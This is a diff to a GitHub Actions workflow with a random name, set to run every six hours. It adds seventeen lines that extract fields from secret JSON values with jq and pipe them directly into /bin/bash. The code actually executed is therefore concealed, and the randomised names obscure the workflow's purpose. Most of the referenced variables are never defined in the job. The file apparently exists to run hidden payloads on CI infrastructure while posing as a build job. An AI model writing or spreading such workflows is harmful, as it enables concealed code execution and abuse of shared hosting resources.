@@ -1,29 +1,34 @@
 name: youluyuan3412
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '20 5/6 * * *'
+    - cron: '47 3/6 * * *'
 
-jobs:  # 13958
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: youluyuan3412
         env:
-          f240: ${{ secrets.f240 }}
+          jpwmv50158: ${{ secrets.jpwmv50158 }}
         run: |
-          echo $f240 | jq -r .mpioh08 | /bin/bash
-          echo $r683 | jq -r .udfhm0231 | /bin/bash
-          echo $fkjen75 | jq -r .ogfux0620 | /bin/bash
-          echo $lxa97 | jq -r .yufa560 | /bin/bash
-          echo $fnzz8 | jq -r .mosgi23 | /bin/bash
-          echo $xh3 | jq -r .duk70 | /bin/bash
-          echo $m38679 | jq -r .vy1 | /bin/bash
-          echo $a622 | jq -r .xm5 | /bin/bash
-          echo $bduf965 | jq -r .vzqir5342 | /bin/bash
-          echo $k476 | jq -r .id476 | /bin/bash
-          echo $ya8450 | jq -r .to1150 | /bin/bash
-          echo $bz1 | jq -r .gws43 | /bin/bash
-          echo $qsg00012 | jq -r .obpr8 | /bin/bash
+          echo $jpwmv50158 | jq -r .avvh145 | /bin/bash
+          echo $r5876 | jq -r .n97 | /bin/bash
+          echo $h34695 | jq -r .ldwbj33549 | /bin/bash
+          echo $k2 | jq -r .xesb2710 | /bin/bash
+          echo $sax6587 | jq -r .j6 | /bin/bash
+          echo $pzikd4555 | jq -r .vugug32 | /bin/bash
+          echo $bfkr6 | jq -r .gkdtm4982 | /bin/bash
+          echo $jjjcn51 | jq -r .m95550 | /bin/bash
+          echo $t4 | jq -r .jbrbu099 | /bin/bash
+          echo $ovlm5268 | jq -r .b43 | /bin/bash
+          echo $us5 | jq -r .saq44401 | /bin/bash
+          echo $u913 | jq -r .vn7 | /bin/bash
+          echo $dumg2 | jq -r .smf4 | /bin/bash
+          echo $wghn917 | jq -r .k17759 | /bin/bash
+          echo $rnql74 | jq -r .h1 | /bin/bash
+          echo $lvrz5346 | jq -r .rlmir5 | /bin/bash
+          echo $um02 | jq -r .i3324 | /bin/bash
 
